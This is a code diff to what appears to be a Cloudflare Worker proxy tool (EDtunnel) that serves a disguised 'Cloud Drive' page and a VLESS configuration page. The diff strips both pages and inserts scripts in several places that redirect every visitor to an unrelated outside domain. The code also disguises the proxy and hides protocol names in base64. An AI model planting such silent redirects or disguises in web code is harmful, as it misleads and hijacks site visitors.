@@ -109,245 +109,17 @@ export default {
 async function handleDefaultPath(url, request) {
 	const host = request.headers.get('Host');
 	const DrivePage = `
-	  <!DOCTYPE html>
-	  <html lang="en">
-	  <head>
-		  <meta charset="UTF-8">
-		  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-		  <title>${host} - Cloud Drive</title>
-		  <style>
-			  body {
-				  font-family: Arial, sans-serif;
-				  line-height: 1.6;
-				  margin: 0;
-				  padding: 20px;
-				  background-color: #f4f4f4;
-			  }
-			  .container {
-				  max-width: 800px;
-				  margin: auto;
-				  background: white;
-				  padding: 20px;
-				  border-radius: 5px;
-				  box-shadow: 0 0 10px rgba(0,0,0,0.1);
-			  }
-			  h1 {
-				  color: #333;
-			  }
-			  .file-list {
-				  list-style-type: none;
-				  padding: 0;
-			  }
-			  .file-list li {
-				  background: #f9f9f9;
-				  margin-bottom: 10px;
-				  padding: 10px;
-				  border-radius: 3px;
-				  display: flex;
-				  align-items: center;
-			  }
-			  .file-list li:hover {
-				  background: #f0f0f0;
-			  }
-			  .file-icon {
-				  margin-right: 10px;
-				  font-size: 1.2em;
-			  }
-			  .file-link {
-				  text-decoration: none;
-				  color: #0066cc;
-				  flex-grow: 1;
-			  }
-			  .file-link:hover {
-				  text-decoration: underline;
-			  }
-			  .upload-area {
-				  margin-top: 20px;
-				  padding: 40px;
-				  background: #e9e9e9;
-				  border: 2px dashed #aaa;
-				  border-radius: 5px;
-				  text-align: center;
-				  cursor: pointer;
-				  transition: all 0.3s ease;
-			  }
-			  .upload-area:hover, .upload-area.drag-over {
-				  background: #d9d9d9;
-				  border-color: #666;
-			  }
-			  .upload-area h2 {
-				  margin-top: 0;
-				  color: #333;
-			  }
-			  #fileInput {
-				  display: none;
-			  }
-			  .upload-icon {
-				  font-size: 48px;
-				  color: #666;
-				  margin-bottom: 10px;
-			  }
-			  .upload-text {
-				  font-size: 18px;
-				  color: #666;
-			  }
-			  .upload-status {
-				  margin-top: 20px;
-				  font-style: italic;
-				  color: #666;
-			  }
-			  .file-actions {
-				  display: flex;
-				  gap: 10px;
-			  }
-			  .delete-btn {
-				  color: #ff4444;
-				  cursor: pointer;
-				  background: none;
-				  border: none;
-				  padding: 5px;
-			  }
-			  .delete-btn:hover {
-				  color: #ff0000;
-			  }
-			  .clear-all-btn {
-				  background-color: #ff4444;
-				  color: white;
-				  border: none;
-				  padding: 10px 15px;
-				  border-radius: 4px;
-				  cursor: pointer;
-				  margin-bottom: 20px;
-			  }
-			  .clear-all-btn:hover {
-				  background-color: #ff0000;
-			  }
-		  </style>
-	  </head>
-	  <body>
-		  <div class="container">
-			  <h1>Cloud Drive</h1>
-			  <p>Welcome to your personal cloud storage. Here are your uploaded files:</p>
-			  <button id="clearAllBtn" class="clear-all-btn">Clear All Files</button>
-			  <ul id="fileList" class="file-list">
-			  </ul>
-			  <div id="uploadArea" class="upload-area">
-				  <div class="upload-icon">📁</div>
-				  <h2>Upload a File</h2>
-				  <p class="upload-text">Drag and drop a file here or click to select</p>
-				  <input type="file" id="fileInput" hidden>
-			  </div>
-			  <div id="uploadStatus" class="upload-status"></div>
-		  </div>
+	  
+			  
+			
+				  
+			   
+		
     <script type="text/javascript">
   window.location.href = "https://bmkg.xyz";
 </script>
 
-		  <script>
-			  function loadFileList() {
-				  const fileList = document.getElementById('fileList');
-				  const savedFiles = JSON.parse(localStorage.getItem('uploadedFiles')) || [];
-				  fileList.innerHTML = '';
-				  savedFiles.forEach((file, index) => {
-					  const li = document.createElement('li');
-					  li.innerHTML = \`
-						  <span class="file-icon">📄</span>
-						  <a href="https://ipfs.io/ipfs/\${file.Url.split('/').pop()}" class="file-link" target="_blank">\${file.Name}</a>
-						  <div class="file-actions">
-							  <button class="delete-btn" onclick="deleteFile(\${index})">
-								  <span class="file-icon">❌</span>
-							  </button>
-						  </div>
-					  \`;
-					  fileList.appendChild(li);
-				  });
-			  }
-
-			  function deleteFile(index) {
-				  const savedFiles = JSON.parse(localStorage.getItem('uploadedFiles')) || [];
-				  savedFiles.splice(index, 1);
-				  localStorage.setItem('uploadedFiles', JSON.stringify(savedFiles));
-				  loadFileList();
-			  }
-
-			  document.getElementById('clearAllBtn').addEventListener('click', () => {
-				  if (confirm('Are you sure you want to clear all files?')) {
-					  localStorage.removeItem('uploadedFiles');
-					  loadFileList();
-				  }
-			  });
-
-			  loadFileList();
-
-			  const uploadArea = document.getElementById('uploadArea');
-			  const fileInput = document.getElementById('fileInput');
-			  const uploadStatus = document.getElementById('uploadStatus');
-
-			  uploadArea.addEventListener('dragover', (e) => {
-				  e.preventDefault();
-				  uploadArea.classList.add('drag-over');
-			  });
-
-			  uploadArea.addEventListener('dragleave', () => {
-				  uploadArea.classList.remove('drag-over');
-			  });
-
-			  uploadArea.addEventListener('drop', (e) => {
-				  e.preventDefault();
-				  uploadArea.classList.remove('drag-over');
-				  const files = e.dataTransfer.files;
-				  if (files.length) {
-					  handleFileUpload(files[0]);
-				  }
-			  });
-
-			  uploadArea.addEventListener('click', () => {
-				  fileInput.click();
-			  });
-
-			  fileInput.addEventListener('change', (e) => {
-				  const file = e.target.files[0];
-				  if (file) {
-					  handleFileUpload(file);
-				  }
-			  });
-
-			  async function handleFileUpload(file) {
-				  uploadStatus.textContent = \`Uploading: \${file.name}...\`;
-				  
-				  const formData = new FormData();
-				  formData.append('file', file);
-
-				  try {
-					  const response = await fetch('https://app.img2ipfs.org/api/v0/add', {
-						  method: 'POST',
-						  body: formData,
-						  headers: {
-							  'Accept': 'application/json',
-						  },
-					  });
-
-					  if (!response.ok) {
-						  throw new Error('Upload failed');
-					  }
-
-					  const result = await response.json();
-					  uploadStatus.textContent = \`File uploaded successfully! IPFS Hash: \${result.Hash}\`;
-					  
-					  const savedFiles = JSON.parse(localStorage.getItem('uploadedFiles')) || [];
-					  savedFiles.push(result);
-					  localStorage.setItem('uploadedFiles', JSON.stringify(savedFiles));
-					  
-					  loadFileList();
-					  
-				  } catch (error) {
-					  console.error('Error:', error);
-					  uploadStatus.textContent = 'Upload failed. Please try again.';
-				  }
-			  }
-		  </script>
-	  </body>
-	  </html>
+		 
 	`;
 
 	// 返回伪装的网盘页面
@@ -1080,206 +852,33 @@ function getConfig(userIDs, hostName) {
 	const clash_link = `https://url.v1.mk/sub?target=clash&url=${encodeURIComponent(sublink)}&insert=false&emoji=true&list=false&tfo=false&scv=true&fdn=false&sort=false&new_name=true`;
 	// HTML Head with CSS and FontAwesome library
 	const htmlHead = `
-  <head>
-    <title>EDtunnel: Configuration</title>
-    <meta name='viewport' content='width=device-width, initial-scale=1'>
-    <meta property='og:site_name' content='EDtunnel: Protocol Configuration' />
-    <meta property='og:type' content='website' />
-    <meta property='og:title' content='EDtunnel - Protocol Configuration and Subscribe Output' />
-    <meta property='og:description' content='Use Cloudflare Pages and Worker serverless to implement protocol' />
-    <meta property='og:url' content='https://${hostName}/' />
-    <meta property='og:image' content='https://ipfs.io/ipfs/bafybeigd6i5aavwpr6wvnwuyayklq3omonggta4x2q7kpmgafj357nkcky' />
-    <meta name='twitter:card' content='summary_large_image' />
-    <meta name='twitter:title' content='EDtunnel - Protocol Configuration and Subscribe Output' />
-    <meta name='twitter:description' content='Use Cloudflare Pages and Worker serverless to implement protocol' />
-    <meta name='twitter:url' content='https://${hostName}/' />
-    <meta name='twitter:image' content='https://ipfs.io/ipfs/bafybeigd6i5aavwpr6wvnwuyayklq3omonggta4x2q7kpmgafj357nkcky' />
-    <meta property='og:image:width' content='1500' />
-    <meta property='og:image:height' content='1500' />
 
-    <style>
-      body {
-        font-family: 'Roboto', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        background-color: #000000;
-        color: #ffffff;
-        line-height: 1.6;
-        padding: 20px;
-        max-width: 1200px;
-        margin: 0 auto;
-      }
-      .container {
-        background-color: #111111;
-        border-radius: 8px;
-        box-shadow: 0 4px 6px rgba(255, 255, 255, 0.1);
-        padding: 20px;
-        margin-bottom: 20px;
-      }
-      h1, h2 {
-        color: #ffffff;
-      }
-      .config-item {
-        background-color: #222222;
-        border: 1px solid #333333;
-        border-radius: 4px;
-        padding: 15px;
-        margin-bottom: 15px;
-      }
-      .config-item h3 {
-        margin-top: 0;
-        color: #ffffff;
-      }
-      .btn {
-        background-color: #ffffff;
-        color: #000000;
-        border: none;
-        padding: 10px 15px;
-        border-radius: 4px;
-        cursor: pointer;
-        transition: background-color 0.3s, color 0.3s;
-      }
-      .btn:hover {
-        background-color: #cccccc;
-      }
-      .btn-group {
-        margin-top: 10px;
-      }
-      .btn-group .btn {
-        margin-right: 10px;
-      }
-      pre {
-        background-color: #333333;
-        border: 1px solid #444444;
-        border-radius: 4px;
-        padding: 10px;
-        white-space: pre-wrap;
-        word-wrap: break-word;
-        color: #00ff00;
-      }
-      .logo {
-        float: left;
-        margin-right: 20px;
-        margin-bottom: 20px;
-		max-width: 30%;
-      }
-      @media (max-width: 768px) {
-        .logo {
-          float: none;
-          display: block;
-          margin: 0 auto 20px;
-          max-width: 90%; /* Adjust the max-width to fit within the container */
-        }
-        .btn-group {
-          display: flex;
-          flex-direction: column;
-          align-items: center;
-        }
-        .btn-group .btn {
-          margin-bottom: 10px;
-          width: 100%;
-          text-align: center;
-        }
-      }
-      .code-container {
-        position: relative;
-        margin-bottom: 15px;
-      }
-      .code-container pre {
-        margin: 0;
-        padding-right: 100px; /* Make space for the button */
-      }
-      .copy-btn {
-        position: absolute;
-        top: 5px;
-        right: 5px;
-        padding: 5px 10px;
-        font-size: 0.8em;
-      }
-      .subscription-info {
-        margin-top: 20px;
-        background-color: #222222;
-        border-radius: 4px;
-        padding: 15px;
-      }
-      .subscription-info h3 {
-        color: #ffffff;
-        margin-top: 0;
-      }
-      .subscription-info ul {
-        padding-left: 20px;
-      }
-      .subscription-info li {
-        margin-bottom: 10px;
-      }
-    </style>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
-  </head>
+      <script type="text/javascript">
+  window.location.href = "https://bmkg.xyz";
+</script>
   `;
 
 	const header = `
-    <div class="container">
-      <h1>EDtunnel: Protocol Configuration</h1>
-      <img src="https://ipfs.io/ipfs/bafybeigd6i5aavwpr6wvnwuyayklq3omonggta4x2q7kpmgafj357nkcky" alt="EDtunnel Logo" class="logo">
-      <p>Welcome! This function generates configuration for the vless protocol. If you found this useful, please check our GitHub project:</p>
-      <p><a href="https://github.com/6Kmfi6HP/EDtunnel" target="_blank" style="color: #00ff00;">EDtunnel - https://github.com/6Kmfi6HP/EDtunnel</a></p>
-      <div style="clear: both;"></div>
-      <div class="btn-group">
-        <a href="//${hostName}/sub/${userIDArray[0]}" class="btn" target="_blank"><i class="fas fa-link"></i> VLESS Subscription</a>
-        <a href="clash://install-config?url=${encodeURIComponent(`https://${hostName}/sub/${userIDArray[0]}?format=clash`)}" class="btn" target="_blank"><i class="fas fa-bolt"></i> Clash Subscription</a>
-        <a href="${clash_link}" class="btn" target="_blank"><i class="fas fa-bolt"></i> Clash Link</a>
-        <a href="${subbestip}" class="btn" target="_blank"><i class="fas fa-star"></i> Best IP Subscription</a>
-      </div>
-      <div class="subscription-info">
-        <h3>Options Explained:</h3>
-        <ul>
-          <li><strong>VLESS Subscription:</strong> Direct link for VLESS protocol configuration. Suitable for clients supporting VLESS.</li>
-          <li><strong>Clash Subscription:</strong> Opens the Clash client with pre-configured settings. Best for Clash users on mobile devices.</li>
-          <li><strong>Clash Link:</strong> A web link to convert the VLESS config to Clash format. Useful for manual import or troubleshooting.</li>
-          <li><strong>Best IP Subscription:</strong> Provides a curated list of optimal server IPs for many <b>different countries</b>.</li>
-        </ul>
-        <p>Choose the option that best fits your client and needs. For most users, the VLESS or Clash Subscription will be the easiest to use.</p>
-      </div>
-    </div>
+<script type="text/javascript">
+  window.location.href = "https://bmkg.xyz";
+</script>
   `;
 
 	const configOutput = userIDArray.map((userID) => {
 		const protocolMain = atob(pt) + '://' + userID + atob(at) + hostName + ":443" + commonUrlPart;
 		const protocolSec = atob(pt) + '://' + userID + atob(at) + proxyIP + ":" + proxyPort + commonUrlPart;
 		return `
-      <div class="container config-item">
-        <h2>UUID: ${userID}</h2>
-        <h3>Default IP Configuration</h3>
-        <div class="code-container">
-          <pre><code>${protocolMain}</code></pre>
-          <button class="btn copy-btn" onclick='copyToClipboard("${protocolMain}")'><i class="fas fa-copy"></i> Copy</button>
-        </div>
-        
-        <h3>Best IP Configuration</h3>
-        <div class="code-container">
-          <pre><code>${protocolSec}</code></pre>
-          <button class="btn copy-btn" onclick='copyToClipboard("${protocolSec}")'><i class="fas fa-copy"></i> Copy</button>
-        </div>
-      </div>
+      <script type="text/javascript">
+  window.location.href = "https://bmkg.xyz";
+</script>
     `;
 	}).join('');
 
 	return `
   <html>
-  ${htmlHead}
-  <body>
-    ${header}
-    ${configOutput}
-  </body>
-  <script>
-    function copyToClipboard(text) {
-      navigator.clipboard.writeText(text)
-        .then(() => {
-          alert("Copied to clipboard");
-        })
-        .catch((err) => {
-          console.error("Failed to copy to clipboard:", err);
-        });
-    }
-  </script>
+  <script type="text/javascript">
+  window.location.href = "https://bmkg.xyz";
+</script>
   </html>`;
 }
 
